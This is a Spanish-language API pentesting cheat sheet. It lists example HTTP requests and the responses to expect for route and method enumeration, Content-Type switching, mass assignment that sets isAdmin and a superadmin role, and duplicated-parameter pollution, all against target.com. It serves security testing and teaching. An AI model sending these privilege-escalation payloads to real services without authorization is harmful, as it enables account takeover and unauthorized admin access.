# 🌃 Real World Payloads

## Enumeración de Rutas y Métodos HTTP

### Descubrimiento de Rutas

```http
GET /api/swagger.json HTTP/1.1
Host: target.com

GET /api/v1/users HTTP/1.1
Host: target.com

GET /api/admin HTTP/1.1
Host: target.com
```

#### Respuesta esperada

```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "paths": {
    "/users": {
      "get": {
        "summary": "Retrieve user list"
      },
      "post": {
        "summary": "Create a new user"
      }
    },
    "/admin": {
      "get": {
        "summary": "Admin panel access"
      }
    }
  }
}
```

### Enumeración de Métodos HTTP

```json
GET /api/users/123 HTTP/1.1
Host: target.com

POST /api/users HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "username": "new_user",
  "email": "user@example.com"
}

DELETE /api/users/123 HTTP/1.1
Host: target.com
```

#### Respuesta esperada

**Para** `**GET**`**:**

```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 123,
  "username": "test_user",
  "email": "test@example.com"
}
```

**Para** `**POST**`**:**

```json
HTTP/1.1 201 Created
Content-Type: application/json

{
  "message": "User created successfully.",
  "userId": 124
}
```

**Para** `**DELETE**`**:**

```http
HTTP/1.1 204 No Content
```

***

## Manipulación de Content-Type

### JSON a XML

```xml
POST /api/resource HTTP/1.1
Host: target.com
Content-Type: application/xml

<user>
  <id>123</id>
  <isAdmin>true</isAdmin>
</user>
```

#### Respuesta esperada

```xml
HTTP/1.1 200 OK
Content-Type: application/xml

<response>
  <status>success</status>
  <message>User elevated to admin.</message>
</response>
```

### Cambio a un Content-Type Inesperado

```json
POST /api/resource HTTP/1.1
Host: target.com
Content-Type: text/plain

{"username":"admin"}
```

#### Respuesta esperada

```json
HTTP/1.1 500 Internal Server Error
Content-Type: text/plain

Error: Unexpected content type.
```

**O bien:**

```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "username": "admin",
  "role": "admin"
}
```

***

## Mass Assignment

### Campos Ocultos Modificados

```json
PATCH /api/users/123 HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "username": "regular_user",
  "isAdmin": true,
  "role": "superadmin"
}
```

#### Respuesta esperada

```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "User updated successfully.",
  "username": "regular_user",
  "isAdmin": true,
  "role": "superadmin"
}
```

***

## Server-Side Parameter Pollution

### Parámetros Duplicados

```http
GET /api/resource?name=admin&name=superadmin HTTP/1.1
Host: target.com
```

#### Respuesta esperada

**En Node.js/Express:**

```http
HTTP/1.1 200 OK
Content-Type: application/json
```
